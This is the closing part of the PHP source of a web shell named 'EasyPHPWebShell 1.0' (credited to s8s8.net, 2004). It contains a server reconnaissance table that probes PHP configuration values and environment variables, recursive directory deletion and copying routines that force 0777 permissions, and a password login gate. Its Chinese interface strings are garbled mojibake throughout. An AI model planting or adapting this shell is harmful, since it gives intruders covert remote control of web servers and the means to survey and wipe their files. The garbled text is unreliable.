				echo "<tr bgcolor=\"$color\"><td>{$sinfo[$i][0]}</td><td>{$sinfo[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">æ•ç‰ˆô”Šº“æ”ô•©Œæ·‡â„ƒ¯</td></tr>
			<?php
			for($i=0;$i<9;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$ssql[$i][0]}</td><td>{$ssql[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">ç¼„æµ è·º’Œå…æœµ»–æ·‡â„ƒ¯</td></tr>
			<?php
			for($i=0;$i<17;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sobj[$i][0]}</td><td>{$sobj[$i][1]}</td></tr>";
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">è‡ô’®šæ¶”‰æŸãƒ§œ‹PHPé…ç¼ƒô”Š‚æ•°(æ¾¶šæ¶“ô’‚æ•æ¿ô•ª”¨","é€—åçƒ½š”å¯®€)</td></tr>
			<tr bgcolor="#EEEEEE">
			<form method="post" action="?action=env" enctype="multipart/form-data">
				<td colspan="2">ç’‡ç–¯¾“å…ãƒ¥‚æ•æ‰®š„ProgIdæˆ–ClassId:
					<input name="envname" type="text" size="50" class="style1" value=<?=isset($envname)?$envname:"";?>> 
					<input name="envnameb" type="submit" value="æŸãƒ§œ‹" class="style1">
				</td>
			</form>
			</tr>
			<?php
				if(isset($envname)&&!empty($envname)){
					$envname=explode(",", $envname);
					$i=0;
					while($envname[$i]){
						echo "<tr bgcolor=\"#CCCCCC\"><td colspan=\"2\">æŸãƒ¨ô”¥[{$envname[$i]}]æ¿¡‚æ¶“‹:</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_cfg_varæ–ç‘°¼</td><td>". my_func($envname[$i],1)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>function_existsæ–ç‘°¼</td><td>". my_func($envname[$i],2)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_gpcæ–ç‘°¼</td><td>". my_func($envname[$i],3)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_runtimeæ–ç‘°¼</td><td>". my_func($envname[$i],4)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Getenvæ–ç‘°¼</td><td>". my_func($envname[$i],5)."</td></tr>";	
						$i++;
					}
				}
			?>
		</table><br>
	</td>
	</tr>
	</table>
<?php }else{
	echo "é”™ç’‡ô•ªš„ææµœã‚…‚æ•°</td></tr><tr><td align=\"center\" bgcolor=\"#EEEEEE\"><br><a href=\"?action=dir&dir=".urlencode($dir)."\">ç‚è§„ô‘«æ©”å›æ–‡æµ èˆµµç‘™ˆæ¤¤ç”¸¢</a><p></td></tr></table>";
}echoend();@ob_end_flush();?>

<?php

function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}

function deltree($TagDir){ 
	$mydir=@opendir($TagDir); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$TagDir/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$TagDir/$file")) return false;
		}else if(!is_dir("$TagDir/$file")){
			@chmod("$TagDir/$file", 0777);
			if(!@unlink("$TagDir/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$TagDir", 0777);
	if(!@rmdir($TagDir)) return false;
	return true;
}

function copydir($dirf,$dirt){
    $mydir=@opendir($dirf);
    while($file=@readdir($mydir)){
        if((is_dir("$dirf/$file")) && ($file!=".") && ($file!="..")) {
            if(!file_exists("$dirt/$file")) if(!@mkdir("$dirt/$file")) return false;
            if(!copydir("$dirf/$file","$dirt/$file")) return false;
        }else if(!is_dir("$dirf/$file")) if(!@copy("$dirf/$file","$dirt/$file")) return false;
    }
    return true;
}

function truepath($path){
	if(file_exists($path)) return true;	
	else{
		if(truepath(@dirname($path))){
			if(@mkdir($path)) return true;
			else return false;
		}else return false;
	}
}

function getpageruntime(){
    global $pagestarttime;
    $pagestarttime = explode(' ', $pagestarttime);
    $pageendtime = explode(' ',@microtime());
    return ($pageendtime[0]-$pagestarttime[0]+$pageendtime[1]-$pagestarttime[1]);
}

function echoend(){
    echo "<br><center>æ¤¤ç”¸ãˆ¡‰Ñ†¡Œæ—å •—´:".getpageruntime()." ç»‰’<br>".
    "<span class = \"stylebtext2\">EasyPHPWebShell 1.0(S8S8å¨´‹ç’‡•ç‰ˆ)</span><br>è„šæœô‘”± <b>ç¼ƒ‘ç¼œæŠ€æœô•«ô“Ÿå›(<a href=\"http://www.s8s8.net\">http://www.s8s8.net</a>) ZV(<a href=\"mailto:zvrop@163.com\">zvrop@163.com</a>)</b> ç¼‚–å†™<br>".
    "Copyright (C) 2004 www.s8s8.net All Rights Reserved.</center>";
}

function gettruepath($path){
    return str_replace("\\","/",@realpath($path));
}

function my_func($getname,$tp){
	global $rny, $rnn;
	$out = ($tp==1)?@get_cfg_var($getname):(($tp==2)?@function_exists($getname):(($tp==3)?@get_magic_quotes_gpc($getname):(($tp==4)?@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):"error!"))));
	return ($out == 1)?$rny:(($out == 0)?$rnn:$out);
}

function ch_color($c){
	return $c=="#CCCCCC"?"#EEEEEE":"#CCCCCC";
}

function getloginpass(){
	?>
	<br><br><br><br><br><br><br>
	<table align="center" width="300" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" bgcolor="#000000" class="stylebtext3">
            å¨†ãˆ£¿æµ£è·¨”¨,ç’‡ç–¯¾“å…ãƒ¥¯†ç 
        </td>
    </tr>
	<tr>
		<form method="post" action="?action=login" enctype="multipart/form-data">
        <td align="center" class="style1"><br>ç€µ†ç 
        <input name="pmy_password" type="password" size="30" class="style1"><p>
		<input name="pmy_passwordb" type="submit" value="  ç™å©š™†  " class="style1"><p>
        </td>
    </tr>
	</table>
	<?php
	exit;
}
?>
